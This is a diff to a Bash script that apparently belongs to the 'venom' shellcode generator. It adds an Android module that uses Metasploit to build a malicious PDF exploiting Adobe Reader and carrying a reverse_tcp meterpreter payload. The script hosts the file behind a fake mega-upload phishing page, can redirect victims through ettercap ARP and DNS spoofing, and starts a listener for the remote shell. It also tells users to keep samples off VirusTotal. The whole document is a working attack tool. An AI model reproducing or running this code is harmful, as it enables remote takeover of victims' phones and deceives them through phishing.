@@ -7629,6 +7629,178 @@ fi
 
 
 
+
+
+
+# -----------------------------
+# Android PDF payload 
+# ----------------------------- 
+sh_android_pdf () {
+
+# get user input to build shellcode
+echo "[☠] Enter shellcode settings!"
+lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
+if [ "$?" -eq "0" ]; then
+lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
+N4m=$(zenity --entry --title "☠ FILENAME ☠" --text "Enter payload output name\nexample: vacations" --width 300) > /dev/null 2>&1
+
+
+echo "[☠] Building shellcode -> Android ARM format ..."
+# display final settings to user
+cat << !
+
+    venom settings
+    ╔─────────────────────
+    | LPORT   : $lport
+    | LHOST   : $lhost
+    | FORMAT  : Android ARM -> ANDROID
+    |_PAYLOAD : android/meterpreter/reverse_tcp
+
+!
+
+# use metasploit to build shellcode (msf encoded)
+xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/android/fileformat/adobe_reader_pdf_js_interface; set LHOST $lhost; set LPORT $lport; set FILENAME $N4m.pdf; exploit; exit -y'"
+mv ~/.msf4/local/$N4m.pdf $IPATH/output/$N4m.pdf
+sleep 2
+
+
+# CHOSE HOW TO DELIVER YOUR PAYLOAD
+serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload stored:\n$IPATH/output/$N4m.pdf\n\nchose how to deliver: $N4m.pdf" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" FALSE "apache2 (malicious url)" --width 305 --height 220) > /dev/null 2>&1
+
+
+   if [ "$serv" = "multi-handler (default)" ]; then
+      # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
+      echo "[☠] Start a multi-handler..."
+      echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
+      echo "[☯] Please dont test samples on virus total..."
+        if [ "$MsFlF" = "ON" ]; then
+          xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD android/meterpreter/reverse_tcp; exploit'"
+          cd $IPATH/output
+          # delete utf-8/non-ancii caracters from output
+          tr -cd '\11\12\15\40-\176' < report.log > final.log
+          sed -i "s/\[0m//g" final.log
+          sed -i "s/\[1m\[34m//g" final.log
+          sed -i "s/\[4m//g" final.log
+          sed -i "s/\[K//g" final.log
+          sed -i "s/\[1m\[31m//g" final.log
+          sed -i "s/\[1m\[32m//g" final.log
+          sed -i "s/\[1m\[33m//g" final.log
+          mv final.log $N4m-$lhost.log > /dev/null 2>&1
+          rm report.log > /dev/null 2>&1
+          cd $IPATH/
+        else
+          xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD android/meterpreter/reverse_tcp; exploit'"
+        fi
+      sleep 2
+
+   else
+
+      # edit files nedded
+      echo "[☠] copy files to webroot..."
+      cd $IPATH/output
+      zip $N4m.zip $N4m.pdf > /dev/null 2>&1
+      cd $IPATH
+      cd $IPATH/templates/phishing
+      cp $InJEc12 mega[bak].html
+      sed "s|NaM3|$N4m.zip|g" mega.html > copy.html
+      mv copy.html $ApAcHe/index.html > /dev/null 2>&1
+      cd $IPATH/output
+      cp $N4m.zip $ApAcHe/$N4m.zip > /dev/null 2>&1
+      echo "[☠] loading -> Apache2Server!"
+      echo "---"
+      echo "- SEND THE URL GENERATED TO TARGET HOST"
+
+        if [ "$D0M4IN" = "YES" ]; then
+        # copy files nedded by mitm+dns_spoof module
+        sed "s|NaM3|$N4m.zip|" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html
+        cp $IPATH/output/$N4m.zip $ApAcHe/$N4m.zip
+        echo "- ATTACK VECTOR: http://mega-upload.com"
+        echo "---"
+        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
+        echo "[☠] Start a multi-handler..."
+        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
+        echo "[☯] Please dont test samples on virus total..."
+          if [ "$MsFlF" = "ON" ]; then
+            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD android/meterpreter/reverse_tcp; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+           cd $IPATH/output
+           # delete utf-8/non-ancii caracters from output
+           tr -cd '\11\12\15\40-\176' < report.log > final.log
+           sed -i "s/\[0m//g" final.log
+           sed -i "s/\[1m\[34m//g" final.log
+           sed -i "s/\[4m//g" final.log
+           sed -i "s/\[K//g" final.log
+           sed -i "s/\[1m\[31m//g" final.log
+           sed -i "s/\[1m\[32m//g" final.log
+           sed -i "s/\[1m\[33m//g" final.log
+           mv final.log $N4m-$lhost.log > /dev/null 2>&1
+           rm report.log > /dev/null 2>&1
+           cd $IPATH/
+          else
+            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD android/meterpreter/reverse_tcp; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+          fi
+
+
+        else
+
+
+        echo "- ATTACK VECTOR: http://$lhost"
+        echo "---"
+        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
+        echo "[☠] Start a multi-handler..."
+        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
+        echo "[☯] Please dont test samples on virus total..."
+          if [ "$MsFlF" = "ON" ]; then
+            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD android/meterpreter/reverse_tcp; exploit'"
+            cd $IPATH/output
+            # delete utf-8/non-ancii caracters from output
+            tr -cd '\11\12\15\40-\176' < report.log > final.log
+            sed -i "s/\[0m//g" final.log
+            sed -i "s/\[1m\[34m//g" final.log
+            sed -i "s/\[4m//g" final.log
+            sed -i "s/\[K//g" final.log
+            sed -i "s/\[1m\[31m//g" final.log
+            sed -i "s/\[1m\[32m//g" final.log
+            sed -i "s/\[1m\[33m//g" final.log
+            mv final.log $N4m-$lhost.log > /dev/null 2>&1
+            rm report.log > /dev/null 2>&1
+            cd $IPATH/
+          else
+            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD android/meterpreter/reverse_tcp; exploit'"
+          fi
+        fi
+   fi
+
+
+
+sleep 2
+# CLEANING EVERYTHING UP
+echo "[☠] Cleanning temp generated files..."
+sleep 2
+mv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1
+rm $IPATH/output/my-release-key.Keystore > /dev/null 2>&1
+rm $IPATH/output//$N4m.zip > /dev/null 2>&1
+rm $ApAcHe/index.html > /dev/null 2>&1
+rm $ApAcHe/index.html > /dev/null 2>&1
+rm $ApAcHe/$N4m.zip > /dev/null 2>&1
+clear
+cd $IPATH/
+
+else
+
+  echo ${RedF}[x]${white} Abort module execution ..${Reset};
+  sleep 2
+  sh_android_menu
+  clear
+fi
+}
+
+
+
+
+
+
+
+
 #
 # ELF agent (linux systems)
 #
@@ -12392,6 +12564,15 @@ cat << !
     | AGENT EXECUTION    : sudo ./agent.macho
     | DETECTION RATIO    : https://goo.gl/AhuyGs
 
+    AGENT Nº3:
+    ╔──────────────────────────────────────────────────────────────
+    | TARGET SYSTEMS     : Android
+    | SHELLCODE FORMAT   : Android ARM
+    | AGENT EXTENSION    : PDF
+    | AGENT EXECUTION    : agent.pdf (double clique)
+    | DETECTION RATIO    : https://goo.gl/Empty
+    | AFFECTED VERSIONS  : Adobe Reader versions less than 11.2.0
+
 
     ╔─────────────────────────────────────────────────────────────╗
     ║   M    - Return to main menu                                ║
@@ -12407,6 +12588,7 @@ read choice
 case $choice in
 1) sh_shellcode21 ;;
 2) sh_macho ;;
+3) sh_android_pdf ;;
 m|M) sh_menu ;;
 e|E) sh_exit ;;
 *) echo ${RedF}[x]${white} "$choice": is not a valid Option${Reset}; sleep 2; clear; sh_android_menu ;;
